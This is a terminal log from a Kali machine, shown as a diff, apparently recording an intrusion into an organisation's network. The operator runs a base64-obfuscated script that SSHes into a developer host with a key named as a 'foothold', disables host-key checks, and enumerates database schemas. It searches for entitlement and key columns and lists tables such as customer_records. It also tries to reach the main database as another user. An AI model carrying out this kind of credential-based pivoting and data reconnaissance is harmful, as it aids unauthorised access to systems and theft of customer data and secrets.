@@ -1,0 +1,36 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08db2.sh <<'B64EOF'
+> dGltZW91dCA5MCBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkByb3dhbi1kZXYgJwplY2hvICI9PT0gZXhwb3J0IHRhYmxlcyA9PT0iOyBwc3FsIHNlcnZpY2U9ZmllbGRsaW5rIC1jICJcZHQgZXhwb3J0LioiIDI+JjEKZWNobyAiPT09IHN1cHBvcnQgdGFibGVzID09PSI7IHBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgIlxkdCBzdXBwb3J0LioiIDI+JjEKZWNobyAiPT09IHdvcmtzcGFjZSB0YWJsZXMgPT09IjsgcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAiXGR0IHdvcmtzcGFjZS4qIiAyPiYxCmVjaG8gIj09PSBzZWFyY2ggZW50aXRsZW1lbnQgPT09IjsgcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAic2VsZWN0IHRhYmxlX3NjaGVtYSx0YWJsZV9uYW1lLGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgY29sdW1uX25hbWUgaWxpa2UgYW55KGFycmF5W1wiJWVudGl0bGUlXCIsXCIlcmVsZWFzZSVcIixcIiVjb250ZXh0JVwiLFwiJWtleSVcIl0pIG9yZGVyIGJ5IDEsMiwzOyIgMj4mMSB8IGhlYWQgLTgwCmVjaG8gIj09PSBhbGwgdGFibGVzID09PSI7IHBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgInNlbGVjdCB0YWJsZV9zY2hlbWEsdGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hIG5vdCBpbiAoXCJwZ19jYXRhbG9nXCIsXCJpbmZvcm1hdGlvbl9zY2hlbWFcIikgb3JkZXIgYnkgMSwyOyIgMj4mMSB8IGhlYWQgLTEyMAplY2hvICI9PT0gZmllbGRsaW5rIGRiID09PSI7IHBzcWwgImhvc3Q9ZGF0YS5rZXBsZXJvcHMudGVzdCBwb3J0PTU0MzIgZGJuYW1lPWZpZWxkbGluayB1c2VyPXJvd2FuX2RhdGEgc3NsbW9kZT12ZXJpZnktZnVsbCBzc2xyb290Y2VydD0vaG9tZS9yb3dhbi8ubG9jYWwvc2hhcmUva2VwbGVyb3BzL2NhLmNydCIgLWMgIlxkdCIgMj4mMSB8IGhlYWQgLTMwCicgMj4mMSB8IGhlYWQgLTI2MAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08db2.sh; bash /tmp/k08db2.sh; echo DONEMARK_1795208218418$((6*7))
+=== export tables ===
+                     List of relations
+ Schema |        Name        | Type  |        Owner         
+--------+--------------------+-------+----------------------
+ export | partition_bindings | table | fieldlink_data_owner
+(1 row)
+
+=== support tables ===
+                          List of relations
+ Schema  |            Name            | Type  |        Owner         
+---------+----------------------------+-------+----------------------
+ support | customer_migration_history | table | fieldlink_data_owner
+ support | customer_records           | table | fieldlink_admin
+(2 rows)
+
+=== workspace tables ===
+Did not find any relation named "workspace.*".
+=== search entitlement ===
+ERROR:  column "%entitle%" does not exist
+LINE 1: ..._schema.columns where column_name ilike any(array["%entitle%...
+                                                             ^
+=== all tables ===
+ERROR:  column "pg_catalog" does not exist
+LINE 1: ...ormation_schema.tables where table_schema not in ("pg_catalo...
+                                                             ^
+=== fieldlink db ===
+psql: error: connection to server at "data.keplerops.test" (10.77.50.11), port 5432 failed: FATAL:  pg_hba.conf rejects connection for host "10.77.56.11", user "rowan_data", database "fieldlink", SSL encryption
